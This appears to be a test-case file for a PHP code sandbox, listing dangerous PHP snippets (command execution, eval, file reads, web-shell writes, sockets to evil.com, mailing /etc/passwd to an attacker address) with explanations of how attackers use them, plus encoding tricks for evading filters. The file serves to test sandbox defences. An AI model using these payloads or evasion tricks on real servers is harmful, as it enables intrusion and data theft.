/**
 * PHP Security Attack Vectors
 * 
 * PHP is widely used for web applications and has many dangerous functions
 * that can lead to Remote Code Execution (RCE) and data theft.
 * 
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const phpTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: system()',
    code: `<?php system('whoami'); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Direct System Command Execution
      
      How hackers use this:
      system() executes a shell command and displays the output.
      It's one of the most common PHP RCE vectors.
      
      Real-world impact:
      - Execute any command with web server privileges
      - system('cat /etc/passwd') reveals user accounts
      - system('wget evil.com/shell.php -O shell.php') installs backdoors
      
      Historical note:
      Countless web shell exploits start with system() calls.
      It's in the top 5 most dangerous PHP functions.
    `,
  },
  {
    name: 'PHP: exec()',
    code: `<?php exec('ls -la', $output); print_r($output); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Command Execution with Output Capture
      
      How hackers use this:
      exec() runs a command and captures output into an array.
      Attackers use it to enumerate files and extract data.
      
      Real-world impact:
      - Capture command output for processing
      - Array output is easier to parse
      - Enumerate directories, find config files
    `,
  },
  {
    name: 'PHP: shell_exec()',
    code: `<?php echo shell_exec('id'); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Shell Command with String Output
      
      How hackers use this:
      shell_exec() returns command output as a single string.
      Equivalent to backtick operator.
      
      Real-world impact:
      - Simple output capture
      - Easy to echo directly
      - Often used in web shells
    `,
  },
  {
    name: 'PHP: passthru()',
    code: `<?php passthru('cat /etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Raw Command Output Passthrough
      
      How hackers use this:
      passthru() passes command output directly to the browser.
      Useful for binary output or large data streams.
      
      Real-world impact:
      - Stream files directly to attacker
      - No memory buffering issues
      - Good for exfiltrating binary files
    `,
  },
  {
    name: 'PHP: popen()',
    code: `<?php $h = popen('ls', 'r'); echo fread($h, 1024); pclose($h); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Process Pipe Open
      
      How hackers use this:
      popen() opens a pipe to a process for reading or writing.
      Enables interactive command communication.
      
      Real-world impact:
      - Stream data to/from processes
      - Interactive shell communication
      - Long-running process control
    `,
  },
  {
    name: 'PHP: proc_open()',
    code: `<?php $proc = proc_open('id', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Full Process Control
      
      How hackers use this:
      proc_open() provides complete control over process I/O.
      Most powerful process execution function in PHP.
      
      Real-world impact:
      - Control stdin, stdout, stderr separately
      - Create interactive shells
      - Complex process pipelines
    `,
  },
  {
    name: 'PHP: pcntl_exec()',
    code: `<?php pcntl_exec('/bin/sh', ['-c', 'id']); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Process Control Execution
      
      How hackers use this:
      pcntl_exec() replaces the current process with a new one.
      Part of the pcntl extension for Unix process control.
      
      Real-world impact:
      - Replace PHP process with shell
      - Execute binaries directly
      - Harder to trace
    `,
  },
  {
    name: 'PHP: Backtick operator',
    code: `<?php echo \`whoami\`; ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Backtick Command Execution
      
      How hackers use this:
      Backticks are a shorthand for shell_exec().
      Less obvious than function calls.
      
      Real-world impact:
      - Subtle command execution
      - Often missed in code review
      - Equivalent to shell_exec()
    `,
  },
  {
    name: 'PHP: expect_popen',
    code: `<?php expect_popen('spawn /bin/bash'); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Expect Extension Process Control
      
      How hackers use this:
      The expect extension can spawn interactive processes.
      Used for automation but dangerous in web contexts.
      
      Real-world impact:
      - Spawn interactive shells
      - Automate system interactions
      - Less common, may bypass filters
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CODE INJECTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: eval()',
    code: `<?php eval('echo "pwned";'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Dynamic Code Execution
      
      How hackers use this:
      eval() executes a string as PHP code.
      The most dangerous PHP function for RCE.
      
      Real-world impact:
      - Execute any PHP code from strings
      - Web shells use eval($_POST['cmd'])
      - Bypass any input filters
      
      Famous exploits:
      Many WordPress/Joomla exploits use eval injection
    `,
  },
  {
    name: 'PHP: assert()',
    code: `<?php assert('system("id")'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Assert Code Execution (PHP < 8)
      
      How hackers use this:
      In PHP < 8, assert() with a string argument executes it as code.
      Often overlooked as a security risk.
      
      Real-world impact:
      - Eval alternative that may bypass filters
      - Works in older PHP versions
      - Less suspicious function name
    `,
  },
  {
    name: 'PHP: create_function()',
    code: `<?php $f = create_function('', 'system("id");'); $f(); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Dynamic Function Creation
      
      How hackers use this:
      create_function() builds functions from strings (like eval).
      Deprecated but still works in many environments.
      
      Real-world impact:
      - Create and execute malicious functions
      - Bypass eval() blocking
      - Anonymous function with code injection
    `,
  },
  {
    name: 'PHP: preg_replace /e modifier',
    code: `<?php @preg_replace('/.*/e', 'system("id")', ''); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Regex Eval Modifier
      
      How hackers use this:
      The /e modifier (deprecated) evaluates the replacement as PHP.
      Classic PHP vulnerability vector.
      
      Real-world impact:
      - Execute code in regex replacements
      - Many old exploits use this
      - Removed in PHP 7, but legacy code exists
    `,
  },
  {
    name: 'PHP: preg_replace_callback',
    code: `<?php preg_replace_callback('/./', function($m) { system('id'); }, 'a'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Regex Callback Execution
      
      How hackers use this:
      preg_replace_callback() calls a function for each match.
      The callback can contain malicious code.
      
      Real-world impact:
      - Execute code for each regex match
      - Modern alternative to /e modifier
      - Function-based code injection
    `,
  },
  {
    name: 'PHP: call_user_func',
    code: `<?php call_user_func('system', 'id'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Dynamic Function Call
      
      How hackers use this:
      call_user_func() calls any function by name.
      Enables calling dangerous functions dynamically.
      
      Real-world impact:
      - Call any function by string name
      - Bypass direct function name filters
      - call_user_func('sys'.'tem', 'id') bypasses simple checks
    `,
  },
  {
    name: 'PHP: call_user_func_array',
    code: `<?php call_user_func_array('system', ['id']); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Dynamic Function Call with Array Args
      
      How hackers use this:
      call_user_func_array() passes arguments as an array.
      Useful for variable argument counts.
      
      Real-world impact:
      - Same as call_user_func with array arguments
      - More flexible for complex payloads
    `,
  },
  {
    name: 'PHP: array_map callback',
    code: `<?php array_map('system', ['id']); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Array Function Callback Abuse
      
      How hackers use this:
      array_map() applies a callback to each array element.
      Using 'system' as callback executes commands.
      
      Real-world impact:
      - Execute commands for each array element
      - Less obvious than direct system() call
      - Often missed in code audits
    `,
  },
  {
    name: 'PHP: array_filter callback',
    code: `<?php array_filter(['id'], 'system'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Array Filter Callback Abuse
      
      How hackers use this:
      array_filter() can use a callback for filtering.
      Using 'system' executes each element as a command.
      
      Real-world impact:
      - Same pattern as array_map abuse
      - Commands in array are executed
      - Callback-based code injection
    `,
  },
  {
    name: 'PHP: array_walk callback',
    code: `<?php $a = ['id']; array_walk($a, 'system'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Array Walk Callback Abuse
      
      How hackers use this:
      array_walk() applies callback to each element in place.
      Another array function abusable for code execution.
      
      Real-world impact:
      - Similar to array_map
      - Modifies array in place
      - Callback receives value and key
    `,
  },
  {
    name: 'PHP: array_reduce callback',
    code: `<?php array_reduce(['id'], function($c, $i) { system($i); }); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Array Reduce Callback Abuse
      
      How hackers use this:
      array_reduce() with a malicious callback executes
      code while appearing to do array reduction.
      
      Real-world impact:
      - Hide execution in reduction logic
      - Appears to be data processing
      - Callback receives items sequentially
    `,
  },
  {
    name: 'PHP: usort callback',
    code: `<?php usort([''], function($a,$b){ system('id'); return 0; }); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Sort Callback Abuse
      
      How hackers use this:
      Sorting functions accept comparison callbacks.
      Malicious callbacks execute during sort operations.
      
      Real-world impact:
      - Execute during sort comparison
      - Very subtle attack vector
      - Appears to be innocent sorting
    `,
  },
  {
    name: 'PHP: uasort callback',
    code: `<?php $a=['x']; uasort($a, function($a,$b){ system('id'); return 0; }); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Associative Sort Callback Abuse
      
      How hackers use this:
      uasort() maintains key associations while sorting.
      Same callback abuse as usort().
      
      Real-world impact:
      - Same as usort
      - Preserves array keys
      - Another sorting-based vector
    `,
  },
  {
    name: 'PHP: uksort callback',
    code: `<?php $a=['a'=>1]; uksort($a, function($a,$b){ system('id'); return 0; }); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Key Sort Callback Abuse
      
      How hackers use this:
      uksort() sorts by keys using a callback.
      Callback abuse works here too.
      
      Real-world impact:
      - Sort by keys with code execution
      - Complete set of sort function abuse
    `,
  },
  {
    name: 'PHP: register_shutdown_function',
    code: `<?php register_shutdown_function('system', 'id'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Shutdown Handler Registration
      
      How hackers use this:
      Register a function to run when PHP shuts down.
      Malicious handlers persist until script ends.
      
      Real-world impact:
      - Execute code at script termination
      - Guaranteed execution even on errors
      - Cleanup-based persistence
    `,
  },
  {
    name: 'PHP: register_tick_function',
    code: `<?php declare(ticks=1); register_tick_function('system', 'id'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Tick Function Registration
      
      How hackers use this:
      Tick functions run every N statements.
      Can execute code repeatedly during execution.
      
      Real-world impact:
      - Repeated code execution
      - Monitoring/interception capabilities
      - Less common, may bypass filters
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: file_get_contents',
    code: `<?php echo file_get_contents('/etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Content Reading
      
      How hackers use this:
      file_get_contents() reads entire files into strings.
      Most common file reading function in PHP.
      
      Real-world impact:
      - Read /etc/passwd for user enumeration
      - Access application source code
      - Read config files with credentials
      - Database connection strings
    `,
  },
  {
    name: 'PHP: file_put_contents',
    code: `<?php file_put_contents('/tmp/shell.php', '<?php system($_GET["c"]); ?>'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Writing / Web Shell Creation
      
      How hackers use this:
      file_put_contents() writes data to files.
      Primary method for creating web shells.
      
      Real-world impact:
      - Create PHP web shells
      - Modify existing PHP files
      - Write SSH keys for persistence
      - Create cron jobs
    `,
  },
  {
    name: 'PHP: file() function',
    code: `<?php print_r(file('/etc/passwd')); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Line Reading
      
      How hackers use this:
      file() reads a file into an array of lines.
      Easy to process file contents.
      
      Real-world impact:
      - Read files as arrays
      - Process line by line
      - Easier parsing than file_get_contents
    `,
  },
  {
    name: 'PHP: fopen/fread',
    code: `<?php $f = fopen('/etc/passwd', 'r'); echo fread($f, 1000); fclose($f); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Low-Level File Operations
      
      How hackers use this:
      fopen/fread provide fine-grained file access.
      Can read specific portions of files.
      
      Real-world impact:
      - Streaming file access
      - Read large files in chunks
      - Seek to specific positions
    `,
  },
  {
    name: 'PHP: readfile()',
    code: `<?php readfile('/etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Direct File Output
      
      How hackers use this:
      readfile() outputs a file directly to the browser.
      No buffering, efficient for large files.
      
      Real-world impact:
      - Stream files to attacker
      - No memory buffering
      - Good for binary exfiltration
    `,
  },
  {
    name: 'PHP: include',
    code: `<?php include('/etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Local File Inclusion (LFI)
      
      How hackers use this:
      include() loads and executes a PHP file.
      With non-PHP files, content is displayed.
      
      Real-world impact:
      - LFI to RCE via log poisoning
      - Read sensitive files
      - Include remote files if enabled
      - Major vulnerability class
    `,
  },
  {
    name: 'PHP: include_once',
    code: `<?php include_once('/var/log/apache2/error.log'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Log Poisoning LFI
      
      How hackers use this:
      Include log files that contain attacker-controlled content.
      If PHP code was injected into logs, it executes.
      
      Real-world impact:
      - Classic LFI to RCE technique
      - Inject <?php system($_GET[c])?> via User-Agent
      - Then include the log file
    `,
  },
  {
    name: 'PHP: require',
    code: `<?php require('/etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Required File Inclusion
      
      How hackers use this:
      require() is like include() but fatal on failure.
      Same LFI vulnerability pattern.
      
      Real-world impact:
      - Same as include() attacks
      - Script dies if file not found
      - Often used for critical includes
    `,
  },
  {
    name: 'PHP: scandir',
    code: `<?php print_r(scandir('/')); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Directory Enumeration
      
      How hackers use this:
      scandir() lists directory contents.
      Essential for mapping the file system.
      
      Real-world impact:
      - Discover file structure
      - Find config files, backups
      - Locate writable directories
    `,
  },
  {
    name: 'PHP: glob',
    code: `<?php print_r(glob('/etc/*')); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Pattern-Based File Discovery
      
      How hackers use this:
      glob() finds files matching patterns.
      Powerful for discovering specific file types.
      
      Real-world impact:
      - Find all .php files: glob('*.php')
      - Find config: glob('/etc/*.conf')
      - Recursive search with patterns
    `,
  },
  {
    name: 'PHP: show_source',
    code: `<?php show_source('/var/www/html/config.php'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Source Code Disclosure
      
      How hackers use this:
      show_source() displays PHP files with syntax highlighting.
      Reveals application source code.
      
      Real-world impact:
      - Read PHP source code
      - Find hardcoded credentials
      - Discover vulnerability patterns
      - Understand application logic
    `,
  },
  {
    name: 'PHP: highlight_file',
    code: `<?php highlight_file('/var/www/html/wp-config.php'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Syntax Highlighted Source Disclosure
      
      How hackers use this:
      highlight_file() is alias of show_source().
      Commonly targeted for WordPress configs.
      
      Real-world impact:
      - WordPress database credentials
      - Displayed in formatted HTML
      - API keys and secrets
    `,
  },
  {
    name: 'PHP: move_uploaded_file',
    code: `<?php move_uploaded_file('/tmp/upload', '/var/www/shell.php'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Upload Bypass
      
      How hackers use this:
      move_uploaded_file() moves uploaded files.
      Can be abused to place web shells.
      
      Real-world impact:
      - Move uploaded shell to web directory
      - Bypass upload validation
      - Classic upload vulnerability exploitation
    `,
  },
  {
    name: 'PHP: copy',
    code: `<?php copy('/etc/passwd', '/var/www/html/passwd.txt'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Copying
      
      How hackers use this:
      copy() duplicates files to new locations.
      Move sensitive files to accessible locations.
      
      Real-world impact:
      - Copy sensitive files to web root
      - Make private files publicly accessible
      - Duplicate for exfiltration
    `,
  },
  {
    name: 'PHP: unlink',
    code: `<?php unlink('/var/www/html/index.php'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Deletion
      
      How hackers use this:
      unlink() deletes files.
      Destructive attack or evidence removal.
      
      Real-world impact:
      - Delete application files
      - Remove logs to cover tracks
      - Denial of service by deletion
    `,
  },
  {
    name: 'PHP: symlink',
    code: `<?php symlink('/etc/passwd', '/var/www/html/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Symlink Attack
      
      How hackers use this:
      symlink() creates symbolic links.
      Link sensitive files to accessible locations.
      
      Real-world impact:
      - Expose /etc/passwd via web server
      - Bypass directory restrictions
      - Classic symlink vulnerability
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: fsockopen',
    code: `<?php $fp = fsockopen('evil.com', 80); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Raw Socket Connection
      
      How hackers use this:
      fsockopen() creates network connections.
      Used for reverse shells and data exfiltration.
      
      Real-world impact:
      - Reverse shell connections
      - HTTP requests to C2 servers
      - Port scanning
      - SSRF attacks
    `,
  },
  {
    name: 'PHP: pfsockopen',
    code: `<?php $fp = pfsockopen('evil.com', 4444); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Persistent Socket Connection
      
      How hackers use this:
      pfsockopen() creates persistent connections.
      Maintained across requests for efficiency.
      
      Real-world impact:
      - Long-lived connections to attackers
      - Efficient repeated communication
      - Connection pooling for attacks
    `,
  },
  {
    name: 'PHP: curl_exec',
    code: `<?php $ch = curl_init('https://evil.com/collect'); curl_exec($ch); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: cURL HTTP Requests
      
      How hackers use this:
      cURL is powerful for HTTP requests.
      Can exfiltrate data or download payloads.
      
      Real-world impact:
      - Send stolen data to attacker
      - Download malware
      - SSRF attacks
      - Complex HTTP operations
    `,
  },
  {
    name: 'PHP: stream_socket_client',
    code: `<?php $fp = stream_socket_client('tcp://evil.com:4444'); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Stream Socket Client
      
      How hackers use this:
      stream_socket_client() is a modern socket API.
      Supports TCP, UDP, and Unix sockets.
      
      Real-world impact:
      - Alternative to fsockopen
      - More protocol options
      - Streaming data connections
    `,
  },
  {
    name: 'PHP: stream_socket_server',
    code: `<?php $server = stream_socket_server('tcp://0.0.0.0:9999'); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Socket Server Creation
      
      How hackers use this:
      Creates a listening socket server.
      Can receive incoming connections.
      
      Real-world impact:
      - Create backdoor listeners
      - Bind shell for remote access
      - Internal network pivot points
    `,
  },
  {
    name: 'PHP: ftp_connect',
    code: `<?php $ftp = ftp_connect('evil.com'); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: FTP Connection
      
      How hackers use this:
      FTP functions enable file transfers.
      Exfiltrate files or download malware.
      
      Real-world impact:
      - Upload stolen files
      - Download additional tools
      - Traditional protocol may bypass monitoring
    `,
  },
  {
    name: 'PHP: mail()',
    code: `<?php mail('attacker@evil.com', 'Data', file_get_contents('/etc/passwd')); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Email Data Exfiltration
      
      How hackers use this:
      mail() sends emails, potentially with stolen data.
      Can also be used for spam.
      
      Real-world impact:
      - Email sensitive files
      - Header injection attacks
      - Spam relay abuse
    `,
  },
  {
    name: 'PHP: stream_get_contents URL',
    code: `<?php echo stream_get_contents(fopen('https://evil.com', 'r')); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Stream-Based URL Fetching
      
      How hackers use this:
      Streams can open URLs like files.
      Alternative to cURL/file_get_contents.
      
      Real-world impact:
      - Download remote content
      - SSRF attacks
      - May bypass URL function filters
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SUPERGLOBAL ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: $_ENV access',
    code: `<?php print_r($_ENV); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 ATTACK: Environment Variable Access
      
      How hackers use this:
      $_ENV contains environment variables with
      potentially sensitive configuration.
      
      Real-world impact:
      - Read API keys
      - Database credentials
      - Cloud service tokens
      - Application secrets
    `,
  },
  {
    name: 'PHP: $_SERVER access',
    code: `<?php print_r($_SERVER); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 ATTACK: Server Information Disclosure
      
      How hackers use this:
      $_SERVER contains server and request information.
      Useful for reconnaissance.
      
      Real-world impact:
      - Reveal server paths
      - Document root location
      - Server software version
      - HTTP headers
    `,
  },
  {
    name: 'PHP: getenv()',
    code: `<?php echo getenv('PATH'); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 ATTACK: Environment Variable Reading
      
      How hackers use this:
      getenv() reads specific environment variables.
      Targeted access to known secrets.
      
      Real-world impact:
      - Read specific credentials
      - Check for specific environment
      - Targeted information gathering
    `,
  },
  {
    name: 'PHP: putenv()',
    code: `<?php putenv('LD_PRELOAD=/tmp/evil.so'); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 ATTACK: Environment Variable Manipulation
      
      How hackers use this:
      putenv() modifies environment variables.
      Can enable exploitation of other vulnerabilities.
      
      Real-world impact:
      - LD_PRELOAD injection for RCE
      - Modify PATH for command hijacking
      - Change application behavior
    `,
  },
  {
    name: 'PHP: apache_getenv',
    code: `<?php print_r(apache_getenv('PATH')); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 ATTACK: Apache Environment Access
      
      How hackers use this:
      Apache-specific environment access.
      May contain additional server info.
      
      Real-world impact:
      - Apache-specific variables
      - Additional reconnaissance data
      - Server configuration details
    `,
  },
  {
    name: 'PHP: apache_setenv',
    code: `<?php apache_setenv('TEST', 'value'); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 ATTACK: Apache Environment Manipulation
      
      How hackers use this:
      Set Apache environment variables.
      Can affect request processing.
      
      Real-world impact:
      - Modify Apache behavior
      - Affect downstream processing
      - Environment-based attacks
    `,
  },
  {
    name: 'PHP: phpinfo()',
    code: `<?php phpinfo(); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 ATTACK: Full PHP Configuration Disclosure
      
      How hackers use this:
      phpinfo() reveals complete PHP configuration.
      Gold mine for attackers planning exploits.
      
      Real-world impact:
      - PHP version and modules
      - Server paths
      - Environment variables
      - Loaded extensions for exploitation
    `,
  },
  {
    name: 'PHP: ini_get',
    code: `<?php echo ini_get('open_basedir'); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 ATTACK: PHP Configuration Reading
      
      How hackers use this:
      ini_get() reads PHP configuration values.
      Reveals security restrictions and settings.
      
      Real-world impact:
      - Check disable_functions
      - Find open_basedir restrictions
      - Discover security misconfigurations
    `,
  },
  {
    name: 'PHP: ini_set',
    code: `<?php ini_set('display_errors', 1); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 ATTACK: PHP Configuration Modification
      
      How hackers use this:
      ini_set() modifies PHP settings at runtime.
      Can weaken security configurations.
      
      Real-world impact:
      - Enable error display for info leak
      - Modify memory limits
      - Change execution settings
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ENCODING BYPASS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: base64_decode bypass',
    code: `<?php eval(base64_decode('c3lzdGVtKCdpZCcp')); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Base64 Encoded Payload
      
      How hackers use this:
      Base64 hides malicious code from filters.
      'c3lzdGVtKCdpZCcp' decodes to system('id').
      
      Real-world impact:
      - Bypass string pattern filters
      - Common in web shells
      - Standard obfuscation technique
    `,
  },
  {
    name: 'PHP: chr() bypass',
    code: `<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f('id'); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Character Code Function Name
      
      How hackers use this:
      Build function names from chr() codes.
      chr(115).chr(121)... = 'system'.
      
      Real-world impact:
      - Bypass function name filters
      - Dynamic function construction
      - Common obfuscation in malware
    `,
  },
  {
    name: 'PHP: hex2bin bypass',
    code: `<?php $cmd = hex2bin('73797374656d'); $cmd('id'); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Hex Encoded Function Name
      
      How hackers use this:
      hex2bin() converts hex to binary/string.
      '73797374656d' = 'system' in hex.
      
      Real-world impact:
      - Alternative to base64
      - Less suspicious encoding
      - Function name obfuscation
    `,
  },
  {
    name: 'PHP: pack() bypass',
    code: `<?php $f = pack('H*', '73797374656d'); $f('id'); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Pack Function for Encoding
      
      How hackers use this:
      pack() converts data between formats.
      Can construct strings from various encodings.
      
      Real-world impact:
      - Flexible encoding/decoding
      - Multiple format options
      - Complex obfuscation chains
    `,
  },
  {
    name: 'PHP: str_rot13 bypass',
    code: `<?php $f = str_rot13('flfgrz'); $f('id'); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: ROT13 Obfuscation
      
      How hackers use this:
      str_rot13() is a simple letter substitution.
      'flfgrz' in ROT13 = 'system'.
      
      Real-world impact:
      - Simple but effective obfuscation
      - Easy to implement and reverse
      - Bypasses naive string checks
    `,
  },
  {
    name: 'PHP: gzinflate bypass',
    code: `<?php eval(gzinflate(base64_decode('compressed_payload'))); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Compressed Payload
      
      How hackers use this:
      gzinflate() decompresses data.
      Combined with base64, hides large payloads.
      
      Real-world impact:
      - Smaller encoded payloads
      - Harder to analyze
      - Common in sophisticated malware
    `,
  },
  {
    name: 'PHP: convert_uuencode bypass',
    code: "<?php $f = convert_uudecode('&<WES=&5M\`'); $f('id'); ?>",
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: UUEncode Obfuscation
      
      How hackers use this:
      UUencode is an older encoding format.
      May bypass filters checking common encodings.
      
      Real-world impact:
      - Alternative encoding method
      - Less commonly filtered
      - Obscure encoding for evasion
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: Safe echo',
    code: `<?php echo 'Hello, World!'; ?>`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Basic Output
      
      This is legitimate code that should execute:
      echo is fundamental for PHP output and
      poses no security risk.
    `,
  },
  {
    name: 'PHP: Safe math',
    code: `<?php echo 2 + 2; ?>`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Mathematical Operations
      
      This is legitimate code that should execute:
      Basic arithmetic is essential for any programming.
    `,
  },
  {
    name: 'PHP: Safe array',
    code: `<?php $arr = [1, 2, 3]; $doubled = []; foreach($arr as $x) { $doubled[] = $x * 2; } echo implode(',', $doubled); ?>`,
    expectBlocked: false,
    expectedOutput: '2,4,6',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Array Operations with foreach
      
      This is legitimate code that should execute:
      Using foreach loops for array transformation is safe.
      Array callback functions like array_map are blocked
      because they can be weaponized with string callbacks.
    `,
  },
  {
    name: 'PHP: Safe class',
    code: `<?php
class Point {
    public int $x;
    public int $y;
    public function __construct(int $x, int $y) {
        $this->x = $x;
        $this->y = $y;
    }
}
$p = new Point(3, 4);
echo $p->x + $p->y;
?>`,
    expectBlocked: false,
    expectedOutput: '7',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Object-Oriented PHP
      
      This is legitimate code that should execute:
      Class definitions and object instantiation
      are core PHP functionality.
    `,
  },
  {
    name: 'PHP: Safe string operations',
    code: `<?php echo strtoupper('hello'); ?>`,
    expectBlocked: false,
    expectedOutput: 'HELLO',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: String Manipulation
      
      This is legitimate code that should execute:
      String functions for formatting and
      manipulation are safe and commonly used.
    `,
  },
];
